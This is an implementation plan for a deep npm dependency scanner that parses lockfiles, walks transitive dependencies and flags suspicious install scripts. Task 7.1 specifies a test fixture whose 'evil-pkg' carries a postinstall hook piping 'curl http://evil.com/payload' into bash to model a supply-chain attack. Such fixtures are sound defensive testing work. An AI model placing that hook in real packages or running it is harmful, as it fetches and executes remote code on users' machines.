# Implementation Plan: Deep Dependency Scanner

## Overview

Implement transitive dependency scanning by building three new components (`LockFileParser`, `RateLimiter`, `DeepDependencyScanner`) and extending `NPMRegistry` with `fetchPackageScripts`. All existing public interfaces remain unchanged. The CLI gains `--deep-scan` and `--max-depth` flags.

## Tasks

- [x] 1. Install fast-check and define shared types
  - Run `npm install --save-dev fast-check` to add the property-based testing library
  - Create `src/security/deep-scan-types.ts` with `DependencyNode`, `DependencyGraph`, and `TransitiveIssueContext` interfaces
  - Export `ScanMode`, `DeepScanOptions`, `ScanStats`, and `DeepScanResult` types from the same file
  - _Requirements: 3.1, 4.1, 6.1, 9.1_

- [x] 2. Implement LockFileParser
  - [x] 2.1 Create `src/security/LockFileParser.ts` with `parse()`, `parseContent()`, `serialize()`, and `detectFormat()` public methods
    - Implement `parseNpmV1()` — recursively walk the `dependencies` object, preserving exact versions
    - Implement `parseNpmV2V3()` — walk the flat `packages` map, derive parent-child from path nesting
    - Implement `parseYarnV1()` — parse the custom Yarn v1 block format (not JSON)
    - Implement `parseYarnBerry()` — return `ParseError { code: 'UNSUPPORTED_FORMAT' }` immediately (out of scope for MVP)
    - All error paths return `ParseError` (never throw); file-not-found returns `FILE_NOT_FOUND`, invalid JSON returns `INVALID_JSON`, bad Yarn syntax returns `INVALID_SYNTAX`
    - _Requirements: 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 2.1, 2.2, 2.3_

  - [ ]* 2.2 Write property test for LockFileParser round-trip (Property 1)
    - **Property 1: LockFile Round-Trip** — `serialize(graph)` then `parseContent(serialized, 'npm-v2')` produces an equivalent graph
    - **Validates: Requirements 1.1, 1.2, 1.3, 1.6, 1.7, 2.1, 3.1**
    - File: `tests/security/LockFileParser.property.test.ts`
    - Use `arbDependencyGraph` arbitrary; minimum 100 runs

  - [ ]* 2.3 Write property test for invalid input → structured error (Property 2)
    - **Property 2: Invalid Lockfile Returns Structured Error** — any non-JSON string returns `ParseError` with non-empty `error` message, never throws
    - **Validates: Requirements 1.4, 2.3**
    - File: `tests/security/LockFileParser.property.test.ts`
    - Use `fc.string()` filtered to strings that are not valid JSON

- [x] 3. Implement RateLimiter
  - [x] 3.1 Create `src/security/RateLimiter.ts` with semaphore + fixed-window token bucket
    - Implement `execute<T>(fn)` — consume token (wait for next 60s window if exhausted), acquire semaphore slot, run fn, release slot in `finally`
    - Implement `getStats()` returning `{ queued, active, completedInWindow }`
    - Constructor accepts `Partial<RateLimiterConfig>` with defaults `maxConcurrent=20`, `maxPerMinute=80`
    - Document the known burst limitation (up to 160 req in a 2-second window boundary) in a JSDoc comment
    - _Requirements: 5.1, 5.2, 5.3, 5.4, 5.5_

  - [ ]* 3.2 Write property test for RateLimiter concurrency and rate invariants (Property 8)
    - **Property 8: Rate Limiter Invariants** — for N concurrent requests, active count never exceeds `maxConcurrent` and completions within any 60s window never exceed `maxPerMinute`
    - **Validates: Requirements 5.1, 5.2, 5.3, 5.4, 5.5**
    - File: `tests/security/RateLimiter.property.test.ts`
    - Use `fc.integer({ min: 1, max: 100 })` for request counts; minimum 100 runs

- [x] 4. Checkpoint — Ensure LockFileParser and RateLimiter tests pass
  - Ensure all tests pass, ask the user if questions arise.

- [x] 5. Extend NPMRegistry with fetchPackageScripts
  - Add `fetchPackageScripts(name: string, version: string): Promise<Record<string, string> | null>` to `src/services/NPMRegistry.ts`
  - Use a separate `scriptsCache: Map<string, Record<string, string> | null>` keyed by `"${name}@${version}"` (independent of the existing `PackageInfo` cache)
  - `GET https://registry.npmjs.org/{name}/{version}` — extract and return the `scripts` field; return `{}` if field is absent; return `null` on 404, network error, or timeout (reuse existing `retryOperation`)
  - _Requirements: 6.3, 12.4_

- [x] 6. Implement DeepDependencyScanner
  - [x] 6.1 Create `src/security/DeepDependencyScanner.ts` with constructor and `deepScan()` public method
    - Constructor accepts `NPMRegistry`, `LockFileParser`, `PatternMatcher`, `RiskScorer`, `IssueGenerator`, `PostInstallDetector`, `RateLimiter`
    - `deepScan(packageJsonPath, lockfilePath, options)` — when `mode='shallow'` delegate to `PostInstallDetector.analyze()` and return; when `mode='deep'` call `LockFileParser.parse()` then `scanDeep()`
    - When no lockfile is found, emit a warning and fall back to shallow mode via `PostInstallDetector`
    - When both lockfiles exist, prefer `package-lock.json` and log info
    - When `maxDepth=0`, return empty `DeepScanResult` immediately
    - _Requirements: 2.4, 2.5, 4.4, 7.1, 7.2, 7.3, 7.4, 7.5, 12.5, 12.6_

  - [x] 6.2 Implement BFS traversal in `scanDeep()` with deduplication and cycle detection
    - Use `visited: Set<string>` (keys already enqueued) and `analysisCache: Map<string, Issue | null>` (keys already analyzed) as described in the design BFS algorithm
    - Skip root node (depth=0) from analysis; stop enqueuing children when `depth >= maxDepth`
    - Record cycles in `DependencyGraph.cycles`; stop traversal on that branch when a cycle is detected
    - Identify direct dependency (depth=1 ancestor) for each node and pass it to `buildTransitiveIssue()`
    - Track `cacheHits` and `cacheMisses` for `ScanStats`
    - _Requirements: 3.3, 3.4, 3.5, 4.2, 4.3, 6.1, 6.2, 6.4, 6.5_

  - [x] 6.3 Implement `analyzePackage()` and `buildTransitiveIssue()`
    - `analyzePackage()` — call `RateLimiter.execute(() => registry.fetchPackageScripts(name, version))`, run each script through `PatternMatcher.detectPatterns()`, score with `RiskScorer`, call `IssueGenerator.createIssue()` if patterns found; mark as `unverified` on null/timeout, `errors` on hard failure
    - `buildTransitiveIssue()` — prepend `[depth: N] [path: root → ... → pkg]` and `[direct dep: X]` to the issue `description`; append `Update or replace direct dependency "${directDep}"` to the `suggestion` field
    - Multi-path deduplication: collect all paths in `paths: Map<string, string[][]>` and merge all paths into a single issue description
    - _Requirements: 4.5, 4.6, 9.1, 9.2, 9.3, 9.4, 9.5, 12.1, 12.2, 12.3, 13.1, 13.3_

  - [ ]* 6.4 Write property tests for DeepDependencyScanner (Properties 3–7, 9–13)
    - **Property 3: Direct Dependencies Assigned Depth 1** — every package in `dependencies`/`devDependencies` appears at depth=1 in the graph — **Validates: Req 3.2**
    - **Property 4: Deduplication** — `fetchPackageScripts` called exactly once per unique `(name, version)` — **Validates: Req 3.3, 6.1, 6.2, 6.3**
    - **Property 5: Cycle Detection Terminates** — BFS on a cyclic graph terminates and cycles are recorded — **Validates: Req 3.4, 3.5**
    - **Property 6: Depth Limiting Respected** — no package at `depth > maxDepth` triggers a registry call — **Validates: Req 4.2, 4.3, 4.4**
    - **Property 7: Issue Metadata Completeness** — every deep-mode issue description contains `depth:` and the full path, and path[1] is a direct dep — **Validates: Req 4.5, 4.6, 9.1, 9.2, 9.3**
    - **Property 9: Scan Idempotence** — two consecutive scans with same inputs produce same issues — **Validates: Req 6.4**
    - **Property 10: Cache Stats Accounting** — `cacheHits + cacheMisses == unique (name,version) pairs`; `analyzed + errors + unverified == attempted` — **Validates: Req 6.5, 13.4**
    - **Property 11: Multi-Path Issue Deduplication** — K paths to same suspicious pkg → exactly 1 issue with all K paths in description — **Validates: Req 9.5**
    - **Property 12: Graceful Degradation** — partial registry failures → valid issues for successes, failed pkgs in `unverified`/`errors` — **Validates: Req 13.1, 13.3**
    - **Property 13: Remediation Suggestion References Direct Dep** — every issue for depth≥2 pkg has direct dep name in `suggestion` — **Validates: Req 9.4**
    - File: `tests/security/DeepDependencyScanner.property.test.ts`; minimum 100 runs each

- [x] 7. Create regression test fixtures and regression test
  - [x] 7.1 Create fixture files under `tests/fixtures/postmark-project/`
    - `package.json` — lists `"postmark": "^3.0.0"` as a direct dependency
    - `package-lock.json` — lockfileVersion 2, includes `postmark@3.0.0` with child `evil-pkg@1.0.0`; `evil-pkg` has `postinstall: "curl http://evil.com/payload | bash"` in its scripts
    - _Requirements: 10.1, 10.2, 10.4_

  - [x] 7.2 Write regression test for postmark-mcp attack pattern
    - Test: deep scan at `maxDepth=3` detects `evil-pkg` at depth=2 with severity `error` and description containing `root → postmark → evil-pkg`
    - Test: deep scan at `maxDepth=3` with a depth=3 malicious package also generates a `Transitive_Issue` with severity `error`
    - Test: shallow mode (`mode='shallow'`) does NOT produce any issue mentioning `evil-pkg` (validates shallow blindness)
    - File: `tests/security/DeepDependencyScanner.regression.test.ts`
    - _Requirements: 10.1, 10.2, 10.3, 10.4, 10.5_

- [x] 8. Checkpoint — Ensure all scanner and regression tests pass
  - Ensure all tests pass, ask the user if questions arise.

- [x] 9. Wire CLI flags --deep-scan and --max-depth
  - Add `.option('--deep-scan', 'Enable transitive dependency analysis')` and `.option('--max-depth <n>', 'Maximum dependency depth (default: 3)', '3')` to the `analyze` command in `cli/index.ts`
  - When `--deep-scan` is set: instantiate `LockFileParser`, `RateLimiter`, `DeepDependencyScanner`; locate lockfile relative to the analyzed file; call `deepScan()` with `mode: 'deep'` and parsed `maxDepth`
  - Print total transitive deps analyzed in the summary line
  - For each issue, print the full `DependencyPath` from the description
  - When no lockfile is found, print a warning and continue in shallow mode
  - _Requirements: 8.1, 8.2, 8.3, 8.4, 8.5, 8.6_

- [x] 10. Final checkpoint — Ensure all tests pass
  - Ensure all tests pass, ask the user if questions arise.

## Notes

- Tasks marked with `*` are optional and can be skipped for faster MVP
- Property tests require `fast-check` — install it in task 1 before running any property tests
- Yarn Berry (v2+) is explicitly out of scope: `LockFileParser` returns `ParseError { code: 'UNSUPPORTED_FORMAT' }` for Berry lockfiles
- The fixed 60-second rate-limit window allows up to 160 req in a 2-second burst at window boundary — this is a documented known limitation, not a bug
- `DependencyNode.children` is populated for display/serialization; BFS uses `DependencyGraph.nodes` Map as source of truth
- `IssueGenerator.createIssue()` is used as-is; transitive context (depth, path) is embedded in the `description` string before calling it
